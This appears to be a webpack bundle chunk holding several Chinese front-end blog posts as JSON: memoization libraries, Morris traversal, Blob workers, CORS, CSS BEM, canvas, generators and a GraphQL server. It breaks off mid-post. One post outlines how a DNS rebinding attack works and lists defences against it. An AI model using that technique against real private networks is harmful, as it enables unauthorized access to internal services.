(window.webpackJsonp=window.webpackJsonp||[]).push([[15,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203],{545:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"nano-memoize--he--fast-memoize\\">nano-memoize 和 fast-memoize</h2>\\n<p>首先，这2个工具的实现源码是极其相似的，基本上，只要阅读了其中一个源码，也就了解了另外一个的实现。</p>\\n<p>fast-memoize导图：\\n<img src=\\"/article/img/fast-memoize.png\\" alt=\\"\\"></p>\\n<p>大概说说它们的实现思路：</p>\\n<ol>\\n<li>定义缓存结构，其中<code>fast</code>使用了<code>无prototype的对象</code>，<code>nano</code>使用了<code>普通对象</code>。</li>\\n<li>定义序列化方法：当检测到是单参数时，都是选择JSON.stringify，而多个参数，两者有不同（后面再说）。</li>\\n<li>定义策略：也就是缓存的具体方法，其实很简单，就是对当前缓存结构查找，找到就返回，找不到就重新运行，\\n 两者都使用了<code>bind</code>方法注入参数，可以省去运行时再去查找参数。</li>\\n</ol>\\n<p>接着分析两者的异同：</p>\\n<p>相同处：</p>\\n<ul>\\n<li>都使用了<code>JSON.stringify</code>作为序列化方法，因为它是原生的。</li>\\n<li>都对返回的缓存函数进行了参数注入（这是一个极大提升性能的方法）。</li>\\n<li>对单参数还是多参数的判断都是使用<code>func.length</code>(形参的数量判断)，因为<code>func.length</code>比<code>arguments.length</code>这种动态判断性能会好很多。</li>\\n</ul>\\n<p>不同点：</p>\\n<ul>\\n<li><code>fast</code>使用了<code>无prototype的对象</code>，<code>nano</code>使用了<code>普通对象</code>(这一点性能上相差不多)。</li>\\n<li>当遇到多个参数时，<code>fast</code>还是继续对<code>arguments</code>进行序列化，而<code>nano</code>则复杂一点，它通过用数组将每一次多个参数保存起来，\\n后续通过遍历每个参数进行全等对比<code>===</code>，判断是否从缓存调取结果。</li>\\n<li>同样是多个参数，<code>nano</code>增加了一个参数max，可以让用户自定义需要进行对比参数的长度。</li>\\n</ul>\\n<p><a href=\\"https://github.com/stonehank/sourcecode-analysis/blob/master/source-code.fast-memoizeVSnano-memoize/README.md\\">更详细的说明和深入理解，可查看源码学习——fast,nano</a></p>\\n<p>假设：</p>\\n<ul>\\n<li>忽略===的执行时间</li>\\n<li>使用的参数分为 引用相同 和 引用不同(但是深比较为true)</li>\\n</ul>\\n<table>\\n<thead>\\n<tr>\\n<th><em>耗时操作</em></th>\\n<th><em>多个参数(引用相同)</em></th>\\n<th></th>\\n<th><em>多个参数(引用不同)</em></th>\\n<th></th>\\n</tr>\\n</thead>\\n<tbody><tr>\\n<td>状态</td>\\n<td>首次运行</td>\\n<td>后续运行</td>\\n<td>首次运行</td>\\n<td>后续运行</td>\\n</tr>\\n<tr>\\n<td>fast</td>\\n<td>序列化+运行</td>\\n<td>序列化</td>\\n<td>序列化+运行</td>\\n<td>序列化</td>\\n</tr>\\n<tr>\\n<td>nano</td>\\n<td>运行</td>\\n<td>0</td>\\n<td>运行</td>\\n<td>运行</td>\\n</tr>\\n</tbody></table>\\n","toc":[{"anchor":"nano-memoize--he--fast-memoize","level":2,"text":"nano-memoize 和 fast-memoize"}],"relatedTags":null,"created_at":"2018-07-15","timeArr":[2018,6,15,0,0,0,0],"title":"2个JS缓存工具学习心得","uuid":"a6a06a76f20c9fd24c4954c100dbd016a75a5974","summary":"<h4>nano-memoize 和 fast-memoize</h4>\\n<p>首先，这2个工具的实现源码是极其相似的，基本上，只要阅读了其中一个源码，也就了解了另外一个的实现。</p>\\n<p>fast-memoize导图：\\n<img src=\\"/article/img/fast-memoize.png\\" alt=\\"\\"></p>\\n<p>大概说说它们的实现思路：</p>\\n<ol>\\n<li>定义缓存结构，其...</li>\\n</ol>","slug":"2-ge-JS-huan-cun-gong-ju-xue-xi-xin-de","sha":"4bdf87c5d346920df9247464ab6b24fdcc7791ab"}')},546:function(n){n.exports=JSON.parse('{"content":"<p>关于二叉树的遍历，使用栈递归或者仿栈循环都是需要<code>O(N)</code>的空间，<code>Morris Traversal</code>保证了空间为<code>O(1)</code>，时间还是<code>O(N)</code>（比原来多了一遍）。</p>\\n<p>这里只介绍<code>inOrder</code>顺序。</p>\\n<p>思路：</p>\\n<p>对每一个<code>cur</code>节点，优先找到一个<code>pre</code>节点，这个<code>pre</code>节点的作用是，当后续<code>cur</code>节点遍历                到这个位置时，可以直接通过这个<code>pre</code>节点返回它需要返回的位置。</p>\\n<p>例如：</p>\\n<pre><code><pre class=\\"hljs\\"><code>        6\\n       / \\\\\\n      4   8\\n    /  \\\\\\n   2    5</code></pre></code></pre><ul>\\n<li>上面当<code>cur</code>节点在<code>6</code>的时候，<code>pre</code>节点会在<code>5</code>，因为后面当<code>cur</code>节点遍历到<code>5</code>的时候，可以通过<code>pre</code>节点直接返回<code>6</code></li>\\n<li>当<code>cur</code>节点再<code>4</code>的时候，<code>pre</code>节点会在<code>2</code>，当后面<code>cur</code>到<code>2</code>的时候，可以直接返回<code>4</code></li>\\n</ul>\\n<hr>\\n<p><code>pre</code>找到了，是通过什么返回呢，因为不能修改二叉树结构，也不能使用堆栈记录。</p>\\n<p>通过<code>mirror</code>(镜像)，也就是说，当找到<code>pre</code>的时候（每个<code>pre</code>的右节点确保为null），在它的右节点创建一个镜像节点，\\n这个镜像节点直接指向当前的<code>cur</code>节点。</p>\\n<p>这个操作是不占用空间的，因为只是互相引用。</p>\\n<p>例如：当上面的<code>cur</code>为<code>6</code>，<code>pre</code>为<code>5</code>，那么设置<code>pre.right=cur</code>，感觉上是这样：</p>\\n<pre><code><pre class=\\"hljs\\"><code>        6\\n       / \\\\\\n      4   8\\n    /  \\\\\\n   2    5\\n         \\\\\\n          6\\n         / \\\\\\n        4   8\\n        ...</code></pre></code></pre><p> 其实并没有多出来那一块，只是<code>5</code>引用到<code>6</code>罢了</p>\\n<pre><code><pre class=\\"hljs\\"><code>         6\\n       / ↑ \\\\\\n      4  ↑  8\\n    /   \\\\↑\\n  2      5\\n</code></pre></code></pre><hr>\\n<p>理解了这些，那么后续就简单了，当<code>cur</code>遍历到<code>pre</code>的时候并且打印后，将<code>pre</code>新增的引用删除恢复原来的树便可。</p>\\n<p>代码：</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">morrisTraversal</span>(<span class=\\"hljs-params\\">root</span>)</span>{\\n  <span class=\\"hljs-keyword\\">let</span> cur=root,pre\\n  <span class=\\"hljs-keyword\\">while</span>(cur!=<span class=\\"hljs-literal\\">null</span>){\\n    <span class=\\"hljs-comment\\">// 当左为空，直接打印</span>\\n    <span class=\\"hljs-keyword\\">if</span>(cur.left==<span class=\\"hljs-literal\\">null</span>){\\n      <span class=\\"hljs-built_in\\">console</span>.log(cur.val)\\n      cur=cur.right\\n    }<span class=\\"hljs-keyword\\">else</span>{\\n      <span class=\\"hljs-comment\\">// 当左不为空，先去找 pre</span>\\n      pre=cur.left\\n      <span class=\\"hljs-keyword\\">while</span>(pre.right!=<span class=\\"hljs-literal\\">null</span> &amp;&amp; pre.right!==cur){\\n        pre=pre.right\\n      }\\n      <span class=\\"hljs-comment\\">// 建立引用，用于返回</span>\\n      <span class=\\"hljs-keyword\\">if</span>(pre.right==<span class=\\"hljs-literal\\">null</span>){\\n        pre.right=cur\\n        cur=cur.left\\n      }<span class=\\"hljs-keyword\\">else</span>{\\n        <span class=\\"hljs-comment\\">// 删除引用</span>\\n        <span class=\\"hljs-built_in\\">console</span>.log(cur.val)\\n        pre.right=<span class=\\"hljs-literal\\">null</span>\\n        cur=cur.right\\n      }\\n    }\\n  }\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2019-01-09","timeArr":[2019,0,9,0,0,0,0],"title":"BST的Morris Traversal-O(1)遍历","uuid":"6bb049b1a078a0b78387fb4624933c478107281e","summary":"<p>关于二叉树的遍历，使用栈递归或者仿栈循环都是需要<code>O(N)</code>的空间，<code>Morris Traversal</code>保证了空间为<code>O(1)</code>，时间还是<code>O(N)</code>（比原来多了一遍）。</p>\\n<p>这里只介绍<code>inOrder</code>顺序。</p>\\n<p>思路：</p>\\n<p>对每一个<code>cur</code>节点，优先找到一个<code>pre</code>节点，这个<code>pre</code>节点的作用是，当后续<code>cur</code>节...</p>","slug":"BST-de-Morris-Traversal-O(1)-bian-li","sha":"58cf220aadf082c27c39c6bf0db303d77f20ea86"}')},547:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"blob-yu-createobjecturl-da-pei-shi-yong\\">Blob与createObjectURL搭配使用</h2>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> blob = <span class=\\"hljs-keyword\\">new</span> Blob([<span class=\\"hljs-built_in\\">document</span>.querySelector(<span class=\\"hljs-string\\">\'#worker\'</span>).textContent]);\\n<span class=\\"hljs-keyword\\">var</span> url = <span class=\\"hljs-built_in\\">window</span>.URL.createObjectURL(blob);\\n<span class=\\"hljs-keyword\\">var</span> worker = <span class=\\"hljs-keyword\\">new</span> Worker(url);\\n\\nworker.onmessage = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> (<span class=\\"hljs-params\\">e</span>) </span>{\\n  <span class=\\"hljs-comment\\">// e.data === \'some message\'</span>\\n};</code></pre></code></pre>\\n<blockquote>\\n<p><code>Blob</code>对象表示一个不可变、原始数据的类文件对象，读取它需要使用FileReader</p>\\n</blockquote>\\n<blockquote>\\n<p>URL.createObjectURL，一个实验性功能，但可以在webworker中使用，创建一个url，这个新的URL 对象表示指定的 File 对象或 Blob 对象。</p>\\n</blockquote>\\n<p>这里blob用来保存了一段<code>script</code>标签内部的内容，再通过<code>createObjectURL</code>将它创建成url格式，让<code>web worker</code>读取。</p>\\n","toc":[{"anchor":"blob-yu-createobjecturl-da-pei-shi-yong","level":2,"text":"Blob与createObjectURL搭配使用"}],"relatedTags":null,"created_at":"2018-07-24","timeArr":[2018,6,24,0,0,0,0],"title":"Blob对象和createObjectURL","uuid":"c2c3bf8775d224910f8bdac31eb7e0ff5a28d431","summary":"<h4>Blob与createObjectURL搭配使用</h4>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">var</span> blob = <span class=\\"hljs-keyword\\">new</span> Blob([<span class=\\"hljs-built_in\\">document</span>.querySelector(<span class=\\"hljs-string\\">\'#worker\'</span>).textContent]);\\n<span class=\\"hljs-keyword\\">var</span> url = <span class=\\"hljs-built_in\\">window</span>.URL.createObjectURL(blob);\\n<span class=\\"hljs-keyword\\">var</span> worker ...</code></pre>","slug":"Blob-dui-xiang-he-createObjectURL","sha":"92b4e89a32882a49232d054e12b2f724a0e9fa68"}')},548:function(n){n.exports=JSON.parse('{"content":"<p>CORS通信就是服务端设置<code>Access-Control-Allow-Origin</code>等配置</p>\\n<p>分为2类请求，简单请求和非简单请求</p>\\n<ul>\\n<li><p>简单请求：</p>\\n<p>  无预检，直接传递数据的时候检查是否同源</p>\\n<p>  Content-Type类型：</p>\\n<p> <code>application/x-www-form-urlencoded</code> 键值对形式 a=1&amp;b=2</p>\\n<p>  <code>multipart/form-data</code> 表单(键值对或者文件)，也就是使用了<code>new FormData()</code>再<code>xhr.send()</code>的格式</p>\\n<p>  <code>text/plain</code>纯文本</p>\\n</li>\\n<li><p>非简单请求：</p>\\n<p>  预检机制：</p>\\n<p>  先检测是否通过同源机制，通过了再进行传递</p>\\n</li>\\n</ul>\\n<p>参考：<a href=\\"https://wangdoc.com/javascript/bom/cors.html\\">https://wangdoc.com/javascript/bom/cors.html</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-08-14","timeArr":[2018,7,14,0,0,0,0],"title":"CORS通信","uuid":"4aa3042e4e1e6dbca1c52b5895fc12ef898bb9a1","summary":"<p>CORS通信就是服务端设置<code>Access-Control-Allow-Origin</code>等配置</p>\\n<p>分为2类请求，简单请求和非简单请求</p>\\n<ul>\\n<li>\\n<p>简单请求：</p>\\n<p>无预检，直接传递数据的时候检查是否同源</p>\\n<p>Content-Type类型：</p>\\n<p>`application/x-www-form-urlenco...</p>\\n</li>\\n</ul>","slug":"CORS-tong-xin","sha":"bc9cd7d945070b9e0abe4cde44baf13cf7044425"}')},549:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"css--de-bem-fang-fa-he-7-1-gui-ze\\">css 的BEM方法和7-1规则</h2>\\n<h3 id=\\"bem\\">BEM</h3>\\n<p>按照<code>Block__Element--Modifier</code>命名</p>\\n<p>例如：</p>\\n<pre><code><pre class=\\"hljs\\"><code>article__author\\narticle__date\\narticle__content-leftAlign\\narticle__content-centerAlign</code></pre></code></pre><p>命名规则：</p>\\n<ul>\\n<li><p>B(Block)：表示模块，最小的可复用单元，功能独立，可以嵌套、组合使用</p>\\n</li>\\n<li><p>E(Element)：B的组成部分</p>\\n</li>\\n<li><p>M（Modifier）：表示E的状态（不同状态下的E有不同的功能和外观），也是B的组成部分</p>\\n</li>\\n</ul>\\n<hr>\\n<h3 id=\\"7-1-gui-ze\\">7-1规则</h3>\\n<ul>\\n<li><p>base: 样板代码，每次新项目都要使用的，例如消除margin等等</p>\\n</li>\\n<li><p>components: 页面的组件，例如 buttons, forms, swipers, popups</p>\\n</li>\\n<li><p>layout: layout结构，例如header，footer</p>\\n</li>\\n<li><p>pages: 一些特定的页面css</p>\\n</li>\\n<li><p>themes: 与主题相关的css</p>\\n</li>\\n<li><p>abstracts: 放置函数，变量和mixin等辅助类</p>\\n</li>\\n<li><p>vendors: 外部依赖，例如 Font Awesome file, Bootstrap</p>\\n</li>\\n</ul>\\n","toc":[{"anchor":"css--de-bem-fang-fa-he-7-1-gui-ze","level":2,"text":"css 的BEM方法和7-1规则"},{"anchor":"bem","level":3,"text":"BEM"},{"anchor":"7-1-gui-ze","level":3,"text":"7-1规则"}],"relatedTags":null,"created_at":"2018-08-08","timeArr":[2018,7,8,0,0,0,0],"title":"CSS BEM和7-1","uuid":"7d006085fe6510e84760d5dac1964ffab407a64b","summary":"<h4>css 的BEM方法和7-1规则</h4>\\n<h4>BEM</h4>\\n<p>按照<code>Block__Element--Modifier</code>命名</p>\\n<p>例如：</p>\\n<pre class=\\"hljs\\"><code>article__author\\narticle__date\\narticle__content-leftAlign\\narticle__content-centerAlign\\n</code></pre>\\n<p>...</p>","slug":"CSS-BEM-he-7-1","sha":"749d64da627880acf963a5302a4e38ce920592d5"}')},550:function(n){n.exports=JSON.parse('{"content":"<p>有时候在执行<code>ctx.clearRect</code>时，并不能清除图片，但通过控制台调试却没有任何问题。</p>\\n<p>通常这发生在调用了例如：<code>lineTo(), arc(), rect()</code>等等，然后执行<code>stroke()</code>或者<code>fill()</code>；</p>\\n<p>这可能是因为我们在绘制路径时并没有调用<code>beginPath()</code>，这导致路径的绘制将储存在内存中，因此<code>clearRect</code>会不起作用。</p>\\n","toc":[],"relatedTags":null,"created_at":"2019-07-10","timeArr":[2019,6,10,0,0,0,0],"title":"Canvas调用clearRect无法清除的解决方案","uuid":"617347c3dd758ed8c49bf011e3ff8d354a6cc190","summary":"<p>有时候在执行<code>ctx.clearRect</code>时，并不能清除图片，但通过控制台调试却没有任何问题。</p>\\n<p>通常这发生在调用了例如：<code>lineTo(), arc(), rect()</code>等等，然后执行<code>stroke()</code>或者<code>fill()</code>；</p>\\n<p>这可能是因为我们在绘制路径时并没有调用<code>beginPath()</code>，这导致路径的绘制将储存...</p>","slug":"Canvas-diao-yong-clearRect-wu-fa-qing-chu-de-jie-jue-fang-an","sha":"0f2e7a7c503d0890c669f8263054b37e4ce2f1e2"}')},551:function(n){n.exports=JSON.parse('{"content":"<p>攻击者需要知道的：</p>\\n<ul>\\n<li>知道被攻击网站地址</li>\\n<li>知道被攻击网站<strong>内部</strong>缺少认证环节</li>\\n<li>知道需要请求的(目标)存放在哪个位置</li>\\n</ul>\\n<p>被攻击这需要做的：</p>\\n<ul>\\n<li>通过诱导链接访问了恶意网站</li>\\n</ul>\\n<p>执行关键点</p>\\n<ul>\\n<li>恶意网站第一次响应DNS为实际DNS，TTL极短，然后执行请求(作用在恶意网站上)。</li>\\n<li>恶意网站第二次响应DNS为Target的IP地址，继续执行以上请求(作用在目标网站上)。</li>\\n</ul>\\n<p>防护措施</p>\\n<ol>\\n<li><p>增加验证(Authorization)。</p>\\n</li>\\n<li><p>IP根据第一次DNS响应值锁定。(对于正常的动态DNS不方便)</p>\\n</li>\\n<li><p>根据主机头来过滤。</p>\\n<blockquote>\\n<p>此标头包含在从现代浏览器发送的所有HTTP请求中，它包含期望与之通信的服务器的主机（主机名：端口）。\\n 此值可以是域名或IP地址，但无论哪种方式，接收请求的服务器都应验证其自己的主机是否与所请求的主机匹配。由于DNS重新绑定依赖于与域名关联的基础IP地址的更改，重绑定到目标服务的恶意HTTP请求中的Host头会保持原始的域名。</p>\\n</blockquote>\\n</li>\\n</ol>\\n<p>参考：<a href=\\"https://bbs.pediy.com/thread-230047.htm\\">利用DNS重绑定攻击专用网络</a></p>\\n","toc":[],"relatedTags":null,"created_at":"2018-11-03","timeArr":[2018,10,3,0,0,0,0],"title":"DNS重绑定攻击-提示点","uuid":"13253a7dee631700da97fcd58ea9765840ae7706","summary":"<p>攻击者需要知道的：</p>\\n<ul>\\n<li>知道被攻击网站地址</li>\\n<li>知道被攻击网站<strong>内部</strong>缺少认证环节</li>\\n<li>知道需要请求的(目标)存放在哪个位置</li>\\n</ul>\\n<p>被攻击这需要做的：</p>\\n<ul>\\n<li>通过诱导链接访问了恶意网站</li>\\n</ul>\\n<p>执行关键点</p>\\n<ul>\\n<li>恶意网站第一次响应DNS为实际DNS，TTL极短，然后执行请求(作用在恶意网站上)。</li>\\n<li>恶意网站第二次响应DN...</li>\\n</ul>","slug":"DNS-zhong-bang-ding-gong-ji-ti-shi-dian","sha":"2d4b04e1670845ec9792e2d6dbb9a9828db06632"}')},552:function(n){n.exports=JSON.parse('{"content":"<p>Generators函数的双向传递</p>\\n<p>每次调用<code>answer()</code>，相当于在<code>generators</code>函数的next方法加入参数，这个参数会返回给<code>yield</code>的返回值</p>\\n<p>在函数内部可以判断这个返回值，实现双向传递</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">let</span> stepCount=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> currentPoint=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> *<span class=\\"hljs-title\\">stepToStep</span>(<span class=\\"hljs-params\\"></span>)</span>{\\n    <span class=\\"hljs-keyword\\">while</span>(stepCount&lt;<span class=\\"hljs-number\\">4</span>){\\n      <span class=\\"hljs-keyword\\">let</span> choose=<span class=\\"hljs-keyword\\">yield</span> <span class=\\"hljs-string\\">\'Choose Left or Right ?Call \\"answer()\\" to answer!\'</span>\\n      <span class=\\"hljs-keyword\\">if</span>(choose===<span class=\\"hljs-string\\">\'left\'</span>)currentPoint+=stepCount++;\\n      <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span> (choose===<span class=\\"hljs-string\\">\'right\'</span>)currentPoint+=<span class=\\"hljs-number\\">1</span>+stepCount++;\\n      <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">`You have arrived at point <span class=\\"hljs-subst\\">${currentPoint}</span>`</span>)\\n    }\\n    <span class=\\"hljs-keyword\\">if</span>(currentPoint===<span class=\\"hljs-number\\">9</span>)<span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'Good End\'</span>)\\n    <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'Bad End\'</span>)\\n  }\\n  <span class=\\"hljs-keyword\\">let</span> start= stepToStep()\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">answer</span>(<span class=\\"hljs-params\\">answer</span>)</span>{\\n    <span class=\\"hljs-built_in\\">console</span>.log(start.next(answer.toLowerCase()).value)\\n  }\\n  <span class=\\"hljs-built_in\\">console</span>.log(start.next().value)</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-14","timeArr":[2018,8,14,0,0,0,0],"title":"ES6的Generators函数双向传值","uuid":"a20bb2e8ea076042017b4a5a990e2aac82af6a1b","summary":"<p>Generators函数的双向传递</p>\\n<p>每次调用<code>answer()</code>，相当于在<code>generators</code>函数的next方法加入参数，这个参数会返回给<code>yield</code>的返回值</p>\\n<p>在函数内部可以判断这个返回值，实现双向传递</p>\\n<pre class=\\"hljs\\"><code>  <span class=\\"hljs-keyword\\">let</span> stepCount=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> currentPoint=<span class=\\"hljs-number\\">1</span>\\n  functi...</code></pre>","slug":"ES6-de-Generators-han-shu-shuang-xiang-chuan-zhi","sha":"cacba9466975c15e93a9cba0db310bf12752a2c2"}')},553:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li><p>为什么要实现一个<code>GraphQL</code>服务器</p>\\n<p>  通过自己实现，更深入了解<code>GraphQL</code>怎么构造，怎么获取，一些术语</p>\\n</li>\\n<li><p>直接入正题，如何实现一个<code>GraphQL</code>服务器</p>\\n<p>  了解4种类型</p>\\n<ul>\\n<li><p>Query</p>\\n<p>  执行内容查询</p>\\n</li>\\n<li><p>Mutation</p>\\n<p>  执行内容变更</p>\\n</li>\\n<li><p>Schema</p>\\n<p>  模式，定义内容结构及类型</p>\\n</li>\\n<li><p>Resolvers</p>\\n<p>  连接<code>Schema</code>和<code>Query</code>，也就是具体内容。</p>\\n</li>\\n</ul>\\n</li>\\n</ul>\\n<ol>\\n<li><p>定义Schema</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">import</span> { gql } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'apollo-server-express\'</span>;\\n\\n <span class=\\"hljs-keyword\\">const</span> typeDefs = gql<span class=\\"hljs-string\\">`\\n     type Person {\\n         id: Int\\n         name: String\\n         gender: String\\n         homeworld: String\\n     }\\n     input DataInput {        \\n         id: Int!\\n         name: String\\n         gender: String\\n         homeworld: String\\n     }\\n     type Mutation {\\n         setPerson(input:DataInput!):Person\\n     }\\n     type Query {\\n         allPeople: [Person]\\n         person(id: Int!): Person\\n     }\\n `</span>;\\n\\n <span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> typeDefs;</code></pre></code></pre>\\n<p> 这里定义了1个自定义查询类<code>Person</code>，1个自定义修改类<code>DataInput</code>，1个<code>Mutation</code>方法，2个<code>Query</code>方法，其中加<code>!</code>表示这个字段不可缺少。</p>\\n</li>\\n<li><p>定义<code>Resolvers</code></p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">const</span> defaultData = [\\n   {\\n     <span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">1</span>,\\n     <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\'Luke SkyWaler\'</span>,\\n     <span class=\\"hljs-attr\\">gender</span>: <span class=\\"hljs-string\\">\'male\'</span>,\\n     <span class=\\"hljs-attr\\">homeworld</span>: <span class=\\"hljs-string\\">\'Tattoine\'</span>\\n   },\\n   {\\n     <span class=\\"hljs-attr\\">id</span>: <span class=\\"hljs-number\\">2</span>,\\n     <span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\'C-3PO\'</span>,\\n     <span class=\\"hljs-attr\\">gender</span>: <span class=\\"hljs-string\\">\'bot\'</span>,\\n     <span class=\\"hljs-attr\\">homeworld</span>: <span class=\\"hljs-string\\">\'Tattoine\'</span>\\n   }\\n ];\\n\\n <span class=\\"hljs-keyword\\">const</span> resolvers = {\\n   <span class=\\"hljs-attr\\">Mutation</span>: {\\n     <span class=\\"hljs-attr\\">setPerson</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">firstParam, {input}</span>) =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">let</span> matchIdx = defaultData.length\\n       <span class=\\"hljs-keyword\\">const</span> {id} = input\\n       <span class=\\"hljs-keyword\\">let</span> matchObj = defaultData.find(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">obj, i</span>) =&gt;</span> {\\n         <span class=\\"hljs-keyword\\">if</span> (obj.id === id) {\\n           matchIdx = i\\n           <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-literal\\">true</span>\\n         }\\n       })\\n       <span class=\\"hljs-keyword\\">let</span> defaultObj\\n       <span class=\\"hljs-keyword\\">if</span> (matchObj) defaultObj = matchObj\\n       <span class=\\"hljs-keyword\\">else</span> defaultObj = {<span class=\\"hljs-attr\\">name</span>: <span class=\\"hljs-string\\">\'\'</span>, <span class=\\"hljs-attr\\">gender</span>: <span class=\\"hljs-string\\">\'\'</span>, <span class=\\"hljs-attr\\">homeworld</span>: <span class=\\"hljs-string\\">\'\'</span>}\\n       <span class=\\"hljs-keyword\\">let</span> newObj = <span class=\\"hljs-built_in\\">Object</span>.assign(defaultObj, input)\\n       defaultData[matchIdx] = newObj\\n       <span class=\\"hljs-keyword\\">return</span> newObj\\n     }\\n   },\\n   <span class=\\"hljs-attr\\">Query</span>: {\\n     <span class=\\"hljs-attr\\">allPeople</span>: <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">()</span> =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">return</span> defaultData;\\n     },\\n     <span class=\\"hljs-attr\\">person</span>: <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">root, {id}</span>) =&gt;</span> {\\n       <span class=\\"hljs-keyword\\">return</span> defaultData.filter(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">character</span> =&gt;</span> {\\n         <span class=\\"hljs-keyword\\">return</span> (character.id === id);\\n       })[<span class=\\"hljs-number\\">0</span>];\\n     }\\n   }\\n };\\n\\n <span class=\\"hljs-keyword\\">export</span> <span class=\\"hljs-keyword\\">default</span> resolvers;</code></pre></code></pre>\\n<p> 这里定义了对<code>Query</code>和<code>Mutation</code>的具体执行方法，注意，它们的值必须是<code>Object</code>或者<code>Function</code>。</p>\\n<blockquote>\\n<p>PS: 这里我没搞清楚 <code>Mutation</code> 第一个参数<code>firstParam</code>的作用，一直都是<code>undefined</code></p>\\n</blockquote>\\n</li>\\n<li><p>创建服务器</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-keyword\\">import</span> express <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'express\'</span>;\\n <span class=\\"hljs-keyword\\">import</span> {ApolloServer, gql } <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'apollo-server-express\'</span>;\\n <span class=\\"hljs-keyword\\">import</span> typeDefs <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./api/schema\'</span>;\\n <span class=\\"hljs-keyword\\">import</span> resolvers <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'./api/resolvers\'</span>;\\n\\n <span class=\\"hljs-keyword\\">const</span> server = <span class=\\"hljs-keyword\\">new</span> ApolloServer({\\n   typeDefs,\\n   resolvers,\\n });\\n\\n <span class=\\"hljs-keyword\\">const</span> app = express();\\n server.applyMiddleware({ app });\\n\\n app.get(<span class=\\"hljs-string\\">\'/\'</span>, (req, res) =&gt; res.send(<span class=\\"hljs-string\\">\'Babel Working!\'</span>));\\n\\n app.listen({ <span class=\\"hljs-attr\\">port</span>: <span class=\\"hljs-number\\">4000</span> }, () =&gt;\\n   <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">`🚀 Server ready at http://localhost:4000<span class=\\"hljs-subst\\">${server.graphqlPath}</span>`</span>)\\n );</code></pre></code></pre>\\n</li>\\n<li><p>package.json</p>\\n<pre><code><pre class=\\"hljs\\"><code> {\\n   &quot;name&quot;: &quot;gh-demo&quot;,\\n   &quot;version&quot;: &quot;1.0.0&quot;,\\n   &quot;description&quot;: &quot;&quot;,\\n   &quot;main&quot;: &quot;index.js&quot;,\\n   &quot;scripts&quot;: {\\n   &quot;dev&quot;: &quot;babel-watch index.js&quot;\\n },\\n   &quot;keywords&quot;: [],\\n   &quot;author&quot;: &quot;&quot;,\\n   &quot;license&quot;: &quot;ISC&quot;,\\n   &quot;dependencies&quot;: {\\n     &quot;apollo-server-express&quot;: &quot;^2.2.1&quot;,\\n     &quot;express&quot;: &quot;^4.16.4&quot;,\\n     &quot;graphql&quot;: &quot;^14.0.2&quot;\\n },\\n   &quot;devDependencies&quot;: {\\n   &quot;babel-cli&quot;: &quot;^6.26.0&quot;,\\n     &quot;babel-preset-env&quot;: &quot;^1.7.0&quot;,\\n     &quot;babel-watch&quot;: &quot;^2.0.7&quot;\\n }\\n }</code></pre></code></pre></li>\\n</ol>\\n<p>参考：<a href=\\"https://medium.com/crowdbotics/creating-a-graphql-server-with-nodejs-ef9814a7e0e6\\">Creating a GraphQL server with 